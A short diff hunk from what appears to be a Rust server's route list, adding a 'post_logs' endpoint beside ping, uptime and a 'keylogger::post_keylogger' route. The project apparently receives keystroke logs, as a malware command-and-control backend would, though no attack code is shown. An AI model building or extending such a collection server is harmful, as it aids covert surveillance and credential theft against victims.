@@ -11,6 +11,7 @@ pub use crate::public_endpoints::proxy;
         get_ping::get_ping,
 
         info::get_uptime::get_uptime,
+        info::post_logs::post_logs,
 
         keylogger::post_keylogger::post_keylogger,
 
